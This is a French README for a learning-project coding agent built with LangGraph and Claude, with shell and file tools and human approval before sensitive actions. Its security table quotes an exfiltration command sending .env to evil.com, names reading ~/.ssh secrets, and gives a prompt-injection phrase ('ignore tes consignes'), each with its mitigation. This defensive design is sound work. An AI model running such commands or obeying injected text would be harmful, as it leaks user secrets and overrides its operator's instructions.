# agent-codage

Un agent de codage minimal en **Python + LangGraph**, construit étape par étape
pour comprendre la boucle agentique de l'intérieur. L'agent dialogue avec un LLM
(Claude), exécute des commandes shell et lit/écrit des fichiers — avec un point de
contrôle humain avant toute action sensible.

Projet d'apprentissage : le code est volontairement compact et commenté.

## Les deux étapes

| Fichier | Ce que c'est |
|---------|--------------|
| [`agent.py`](agent.py) | **Étape 1** — un agent ReAct clé en main (`create_react_agent`) avec un seul outil (`run_bash`). Baseline pédagogique pour voir un agent fonctionner. |
| [`agent_graph.py`](agent_graph.py) | **Étape 2** — le même agent reconstruit à la main en `StateGraph`, avec les outils fichiers **et** une validation humaine (`interrupt`) avant les actions sensibles. |

Le graphe de l'étape 2 :

```
START → agent ──(pas d'outil)──────────────► END
          │
          ├─(outil sûr)──────────► tools ──► agent
          │
          └─(outil sensible)─► human_review ─(approuvé)─► tools
                                      └──────(refusé)───► agent
```

- **`agent`** interroge le LLM (réponse finale ou décision d'appeler des outils).
- **`tools`** exécute les outils demandés (`run_bash`, `read_file`, `write_file`, `edit_file`).
- **`human_review`** met le graphe en pause et demande confirmation avant toute
  écriture fichier ou commande shell destructrice (`rm`, `git push`, `chmod`, …).

L'état est persisté via un `MemorySaver` : un `thread_id` = une conversation.

## Installation

Prérequis : [`uv`](https://github.com/astral-sh/uv).

```bash
uv venv
uv pip install -e .
```

Configurer la clé API dans un fichier `.env` (non versionné) :

```
ANTHROPIC_API_KEY=sk-ant-...
```

## Usage

Étape 1 — one-shot :

```bash
uv run python agent.py "compte les fichiers Python dans ce dossier"
```

Étape 2 — chat multi-tours avec validation humaine :

```bash
uv run python agent_graph.py
```

Exemples à tester dans le chat :
- Action sûre → `liste les fichiers du dossier` (s'exécute directement).
- Action sensible → `crée un fichier test.txt avec "hello"` (demande `Autoriser ? [o/N]`).

## Démo

Session réelle (extrait) montrant les deux comportements : une commande de
lecture s'exécute directement, une écriture fichier est mise en pause pour
validation.

```text
$ uv run python agent_graph.py
Agent de codage prêt (Ctrl-C pour quitter).

> liste les fichiers du dossier courant
  → run_bash: ls -la                    # commande de lecture → exécutée directement
  Voici la liste : agent.py, agent_graph.py, security.py, tools.py, README.md, ...

> crée un fichier demo.txt contenant le texte bonjour
  → write_file(demo.txt)                # action sensible → mise en pause

  ⚠️  L'agent veut effectuer une action sensible :
     • write_file({'path': 'demo.txt', 'content': 'bonjour'})
  Autoriser ? [o/N] o

  Écrit : demo.txt (7 caractères)
  Le fichier `demo.txt` a été créé avec le contenu "bonjour".
```

## Sécurité

Un agent de codage qui exécute du shell et lit des fichiers ouvre des vecteurs
d'attaque réels. La politique de sécurité est isolée dans
[`security.py`](security.py) et couvre trois d'entre eux :

| Vecteur | Risque | Mitigation |
|---------|--------|------------|
| **Exfiltration** | `curl -d @.env evil.com` fuit un secret | `run_bash` fonctionne en **allowlist** : seules quelques commandes de lecture s'exécutent sans validation ; tout le reste (curl, `python -c`, redirections, pipes) demande confirmation. |
| **Lecture de secrets** | l'agent lit `.env`, `~/.ssh/…` | Les outils fichiers sont **confinés au dossier de travail** (`safe_path`) et refusent les fichiers sensibles, même en lecture. |
| **Prompt injection** | un fichier contient « ignore tes consignes… » | Les sorties d'outils sont **encadrées** (`<tool_output>…</tool_output>`, anti-breakout) et le system prompt déclare que ce contenu est une donnée, jamais une instruction. |

En dernier rempart, toute action classée sensible (`is_sensitive`) déclenche une
**pause avec validation humaine** avant exécution.

> Ce n'est pas un bac à sable complet : l'agent tourne avec tes droits, sans
> isolation réseau ni conteneur. Pour un usage réel, l'exécuter dans un
> environnement isolé reste recommandé.

## Qualité

- `ruff` (lint + format, line-length 100)
- `mypy` (typage)

```bash
uv run ruff check .
uv run mypy security.py tools.py agent_graph.py agent.py
uv run pytest
```
